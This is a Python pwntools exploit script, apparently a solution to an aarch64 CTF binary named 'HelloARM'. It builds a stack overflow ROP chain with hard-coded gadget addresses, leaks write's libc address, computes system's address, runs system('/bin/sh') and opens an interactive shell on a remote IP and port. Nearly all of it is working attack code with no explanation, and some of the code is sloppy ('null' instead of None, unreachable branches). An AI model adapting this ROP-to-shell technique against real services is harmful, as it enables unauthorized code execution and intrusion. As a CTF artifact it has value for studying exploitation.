from pwn import *
import sys
context.log_level = 'debug'
context.arch = 'aarch64'
Debug = True

elf = ELF('./HelloARM', checksec=False)
libc = ELF("./lib/libc.so.6", checksec=False)

offset = libc.functions['system'].address - libc.functions['write'].address
write_addr = elf.got["write"]


def get_sh(other_libc=null):
    return remote('10.104.255.210', 7777)
    global libc
    if args['REMOTE']:
        if other_libc is not null:
            libc = ELF("./", checksec=False)
        return remote('10.104.255.210', 7777)
    elif Debug:
        sh = process(["qemu-aarch64", "-g", "2333", "-L", "./", "./HelloARM"])
        log.info('Please use GDB remote!(Enter to continue)')
        raw_input()
        return sh
    else:
        return process(["qemu-aarch64", "-L", "./", "./HelloARM"])


conn = get_sh()
conn.recvline()
bb = conn.recvline()
hex_magic = bb[15:-1].decode('utf-8')
addr_magic = int(hex_magic, 16)

guess_fd = 3
flag_len = 0x20*8 - 8

conn.recv()
conn.send('/bin/sh\0_______')
conn.recvuntil('Set your message:')
payload = ('\0' * 0x100).encode()  # 填充

payload += p64(addr_magic - 0x10)  # x29
payload += p64(0x0000000000400AD0)  # x30 for ret to __libc

# addr_magic-0x10 for w
payload += p64(0x0000000000400730)  # set to write func pointer
# addr_magic-0x08 for r
payload += p64(0x0000000000400760)  # set to read func pointer
# addr_magic

payload += p64(0)  # addr_magic for x19
payload += p64(0)  # addr_magic + 0x8 for system() address
# addr_magic + 0x10 for arg 0
a1 = '/bin/sh\0'.encode()
payload += a1
payload += b'\0' * ((0x20-2)*8 - len(a1))

# x29
payload += p64(addr_magic - 0x10)
# x30
payload += p64(0x0000000000400AB0)  # for ret to __libc stage 2
# padding
payload += p64(0)
# x20
payload += p64(1)  # to compare with x19, mark write() finished
# x21
payload += p64(addr_magic - 0x10)
# x22
payload += p64(1)
# x23
payload += p64(0x0000000000411038)
# x24
payload += p64(8)


# x29
payload += p64(addr_magic - 0x10)
# x30
payload += p64(0x0000000000400AB0) # for ret to __libc stage 2
# padding
payload += p64(0)
# x20
payload += p64(1) # to compare with x19, mark read() finished
# x21
payload += p64(addr_magic - 0x8)
# x22
payload += p64(0)
# x23
payload += p64(addr_magic + 0x8)
# x24
payload += p64(8)


# x29
payload += p64(addr_magic - 0x10)
# x30
payload += p64(0x0000000000400AB0) # for ret to __libc stage 2
# padding
payload += p64(0)
# x20
payload += p64(1) # to compare with x19, mark read() finished
# x21
payload += p64(addr_magic + 0x8)
# x22
payload += p64(0x0000000000411080)
# x23
payload += p64(0)
# x24
payload += p64(0)


conn.send(payload)
conn.recv()
addr_libc_write = conn.recv(numb=8)

print("addr_libc_write: {}".format(addr_libc_write[::-1].hex()))
addr_libc_system = p64(
    offset + int.from_bytes(addr_libc_write, byteorder='little'))
print("addr_libc_system: {}".format(addr_libc_system[::-1].hex()))

conn.send(addr_libc_system)

conn.interactive()
